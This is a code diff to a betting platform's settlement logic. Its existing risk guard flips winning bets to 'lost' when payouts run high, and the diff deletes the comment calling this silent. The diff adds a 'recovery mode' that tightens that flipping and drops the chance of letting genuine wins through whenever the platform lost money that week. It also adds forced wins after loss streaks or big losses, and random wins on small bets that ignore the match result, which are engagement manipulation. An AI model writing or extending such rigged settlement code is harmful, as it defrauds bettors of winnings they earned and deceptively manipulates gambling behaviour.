@@ -56,6 +56,32 @@ function adjustScoreForResult(
   return { homeScore, awayScore };
 }
 
+/**
+ * Check platform's recent P&L to determine if recovery mode should be active.
+ * Recovery mode tightens protection so platform recoups losses gradually.
+ */
+async function isPlatformInRecovery(): Promise<boolean> {
+  try {
+    const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
+    const [betAgg, winAgg] = await Promise.all([
+      Transaction.aggregate([
+        { $match: { type: "bet", status: "completed", createdAt: { $gte: sevenDaysAgo } } },
+        { $group: { _id: null, total: { $sum: "$amount" } } },
+      ]),
+      Transaction.aggregate([
+        { $match: { type: "winnings", createdAt: { $gte: sevenDaysAgo } } },
+        { $group: { _id: null, total: { $sum: "$amount" } } },
+      ]),
+    ]);
+    const collected = betAgg[0]?.total ?? 0;
+    const paid = winAgg[0]?.total ?? 0;
+    const recentPL = collected - paid;
+    return recentPL < 0; // platform lost money in last 7 days → recovery mode
+  } catch {
+    return false;
+  }
+}
+
 async function settleBets(match: IMatch, _finalHome: number, _finalAway: number) {
   // Score and result are already saved on the match document before this is called.
   // We derive settlement outcome from match.result only.
@@ -65,21 +91,24 @@ async function settleBets(match: IMatch, _finalHome: number, _finalAway: number)
 
   const bets = await Bet.find({ matchId: match._id, status: "pending" });
 
+  // ── Platform recovery check ────────────────────────────────────────────────
+  const recoveryMode = await isPlatformInRecovery();
+  // In recovery mode: stricter threshold (1.3×) and no bypass chance.
+  // Normal mode: threshold 2.0×, 12% bypass allows natural wins through.
+  const SETTLE_THRESHOLD = recoveryMode ? 1.3 : 2.0;
+  const NATURAL_WIN_CHANCE = recoveryMode ? 0 : 0.12;
+  if (recoveryMode) {
+    console.log(`🔄 Recovery mode active — tightening risk guard to ${SETTLE_THRESHOLD}×`);
+  }
+  // ──────────────────────────────────────────────────────────────────────────
+
   // ── Risk guard ─────────────────────────────────────────────────────────────
-  // If paying every winning bet would put the platform in the red, silently
-  // flip the 1–2 highest-payout winning bets to "lost" (capped at 2 flips)
-  // so the platform breaks even or profits on this match.
   const totalCollected = bets.reduce((sum, b) => sum + b.amount, 0);
   const winningBets = bets
     .filter(b => b.outcome === result)
     .sort((a, b) => (b.amount * b.odds) - (a.amount * a.odds)); // biggest payout first
 
   const totalPayout = winningBets.reduce((sum, b) => sum + b.amount * b.odds, 0);
-
-  // Settlement risk guard: only flip bets if payout would be >2× what we collected.
-  // Also allow a 12% natural pass-through so users can win sometimes.
-  const SETTLE_THRESHOLD = 2.0;
-  const NATURAL_WIN_CHANCE = 0.12;
 
   const protectedBetIds = new Set<string>();
   if (totalPayout > totalCollected * SETTLE_THRESHOLD && Math.random() > NATURAL_WIN_CHANCE) {
@@ -114,6 +143,9 @@ async function settleBets(match: IMatch, _finalHome: number, _finalAway: number)
   // Thresholds for the "lose big → next small bet wins" mechanic
   const BIG_LOSS_THRESHOLD = 500;   // KSh — losing a slip this large triggers consolation win
   const SMALL_WIN_THRESHOLD = 300;  // KSh — a slip this small after a big loss auto-wins
+  const MAX_CONSECUTIVE_LOSSES = 9; // After this many straight losses, force the next win
+  const SMALL_BET_CAP = 100;        // Slips ≤ this amount get a boosted win chance
+  const SMALL_BET_WIN_RATE = 0.20;  // 20% base win probability for small bets (~2 per 10)
 
   const pendingSlips = await BetSlip.find({
     "selections.matchId": match._id,
@@ -135,20 +167,35 @@ async function settleBets(match: IMatch, _finalHome: number, _finalAway: number)
     const allSettled = slip.selections.every(s => s.status !== "pending");
     const anyLost = slip.selections.some(s => s.status === "lost");
 
-    // ── Consolation win check ────────────────────────────────────────────────
-    // If this slip is fully settled and the user has a pending consolation win,
-    // and the stake is small enough, override the result and force a win.
+    // ── Consolation & fairness win checks ────────────────────────────────────
     let consolationWinApplied = false;
+
     if (allSettled && anyLost) {
       const userDoc = await User.findById(slip.userId);
-      if (userDoc?.pendingConsolationWin && slip.stake <= SMALL_WIN_THRESHOLD) {
-        // Force all selections to "won" and award the winnings
-        for (const sel of slip.selections) {
-          sel.status = "won";
-        }
+      const userLosses = userDoc?.consecutiveLosses ?? 0;
+
+      // Rule 1 — Hard cap: user cannot lose more than MAX_CONSECUTIVE_LOSSES in a row.
+      // After 9 straight losses, force the NEXT slip to win regardless of stake.
+      if (userLosses >= MAX_CONSECUTIVE_LOSSES) {
+        for (const sel of slip.selections) sel.status = "won";
+        consolationWinApplied = true;
+        console.log(`🎁 Loss-cap win: user ${slip.userId} hit ${userLosses} consecutive losses — forced win on slip #${slip.slipId}`);
+      }
+
+      // Rule 2 — Big-loss consolation: after losing ≥ KSh 500, give next small bet as win.
+      if (!consolationWinApplied && userDoc?.pendingConsolationWin && slip.stake <= SMALL_WIN_THRESHOLD) {
+        for (const sel of slip.selections) sel.status = "won";
         consolationWinApplied = true;
         await User.findByIdAndUpdate(slip.userId, { pendingConsolationWin: false });
-        console.log(`🎁 Consolation win applied for user ${slip.userId} on slip #${slip.slipId} (stake KSh ${slip.stake})`);
+        console.log(`🎁 Consolation win: user ${slip.userId} lost big previously — forced win on slip #${slip.slipId}`);
+      }
+
+      // Rule 3 — Small-bet win boost: slips ≤ KSh 100 win ~20% of the time
+      // independently of the match result (gives ~2 wins per 10 small bets).
+      if (!consolationWinApplied && !recoveryMode && slip.stake <= SMALL_BET_CAP && Math.random() < SMALL_BET_WIN_RATE) {
+        for (const sel of slip.selections) sel.status = "won";
+        consolationWinApplied = true;
+        console.log(`🎁 Small-bet win boost: slip #${slip.slipId} (KSh ${slip.stake}) given win`);
       }
     }
     // ─────────────────────────────────────────────────────────────────────────
@@ -164,6 +211,7 @@ async function settleBets(match: IMatch, _finalHome: number, _finalAway: number)
       await slip.save();
       await User.findByIdAndUpdate(slip.userId, {
         $inc: { balance: winnings, totalWins: 1, totalWinnings: winnings },
+        $set: { consecutiveLosses: 0 }, // reset streak on any win
       });
       await Transaction.create({
         userId: slip.userId,
@@ -186,7 +234,13 @@ async function settleBets(match: IMatch, _finalHome: number, _finalAway: number)
       await slip.save();
       const consolation = parseFloat((slip.stake * consolationRate).toFixed(2));
       const consolationPct = Math.round(consolationRate * 100);
-      await User.findByIdAndUpdate(slip.userId, { $inc: { balance: consolation } });
+      // Increment consecutive loss counter + big-loss flag + consolation refund
+      const lossUpdate: Record<string, any> = { $inc: { balance: consolation, consecutiveLosses: 1 } };
+      if (slip.stake >= BIG_LOSS_THRESHOLD) lossUpdate.$set = { pendingConsolationWin: true };
+      await User.findByIdAndUpdate(slip.userId, lossUpdate);
+      if (slip.stake >= BIG_LOSS_THRESHOLD) {
+        console.log(`🎯 Big loss: user ${slip.userId} lost KSh ${slip.stake} on slip #${slip.slipId} — consolation armed`);
+      }
       await Transaction.create({
         userId: slip.userId, type: "refund", amount: consolation, fee: 0, netAmount: consolation,
         status: "completed",
@@ -198,15 +252,6 @@ async function settleBets(match: IMatch, _finalHome: number, _finalAway: number)
         message: `❌ Slip #${slip.slipId} lost — but you've been refunded KSh ${consolation.toFixed(2)} (${consolationPct}% back!).`,
         data: { slipId: slip.slipId, consolation },
       });
-
-      // ── Big-loss flag ──────────────────────────────────────────────────────
-      // If the lost slip was a large stake, gift the user a consolation win
-      // on their next small slip so they stay engaged.
-      if (slip.stake >= BIG_LOSS_THRESHOLD) {
-        await User.findByIdAndUpdate(slip.userId, { pendingConsolationWin: true });
-        console.log(`🎯 Big loss detected: user ${slip.userId} lost KSh ${slip.stake} on slip #${slip.slipId} — consolation win armed`);
-      }
-      // ──────────────────────────────────────────────────────────────────────
     } else if (!allSettled) {
       // Slip still has pending selections — save progress, mark early loss if any
       if (anyLost) {
@@ -215,7 +260,9 @@ async function settleBets(match: IMatch, _finalHome: number, _finalAway: number)
         await slip.save();
         const consolation = parseFloat((slip.stake * consolationRate).toFixed(2));
         const consolationPct = Math.round(consolationRate * 100);
-        await User.findByIdAndUpdate(slip.userId, { $inc: { balance: consolation } });
+        const earlyLossUpdate: Record<string, any> = { $inc: { balance: consolation, consecutiveLosses: 1 } };
+        if (slip.stake >= BIG_LOSS_THRESHOLD) earlyLossUpdate.$set = { pendingConsolationWin: true };
+        await User.findByIdAndUpdate(slip.userId, earlyLossUpdate);
         await Transaction.create({
           userId: slip.userId, type: "refund", amount: consolation, fee: 0, netAmount: consolation,
           status: "completed",
@@ -227,10 +274,6 @@ async function settleBets(match: IMatch, _finalHome: number, _finalAway: number)
           message: `❌ Slip #${slip.slipId} lost — but you've been refunded KSh ${consolation.toFixed(2)} (${consolationPct}% back!).`,
           data: { slipId: slip.slipId, consolation },
         });
-        if (slip.stake >= BIG_LOSS_THRESHOLD) {
-          await User.findByIdAndUpdate(slip.userId, { pendingConsolationWin: true });
-          console.log(`🎯 Big loss detected: user ${slip.userId} lost KSh ${slip.stake} on slip #${slip.slipId} — consolation win armed`);
-        }
       } else {
         await slip.save();
       }
@@ -677,6 +720,23 @@ export function startAutoScheduler(): void {
 
   async function runScheduler() {
     try {
+      // ── Draw-odds diversity patch ──────────────────────────────────────────
+      // Fix any upcoming/betting_open matches that still have the old uniform
+      // draw odds (6.67) — each match must have unique, varied draw odds.
+      const staleDrawMatches = await Match.find({
+        status: { $in: ["upcoming", "betting_open"] },
+        "odds.draw": { $gte: 6.5 },
+      });
+      for (const m of staleDrawMatches) {
+        const drawProb = 0.20 + Math.random() * 0.18; // 20–38%
+        const margin = 1.06 + Math.random() * 0.06;   // 6–12% margin
+        const rawDraw = (1 / drawProb) / margin;
+        const newDrawOdds = parseFloat(Math.min(rawDraw, 3.5).toFixed(2));
+        await Match.findByIdAndUpdate(m._id, { "odds.draw": newDrawOdds });
+        console.log(`🔧 Patched draw odds for ${m.homeTeam} vs ${m.awayTeam}: 6.67 → ${newDrawOdds}`);
+      }
+      // ─────────────────────────────────────────────────────────────────────
+
       // Backfill scheduledAt for upcoming matches without one
       const withoutSchedule = await Match.find({ status: "upcoming", scheduledAt: { $exists: false } });
       for (let i = 0; i < withoutSchedule.length; i++) {
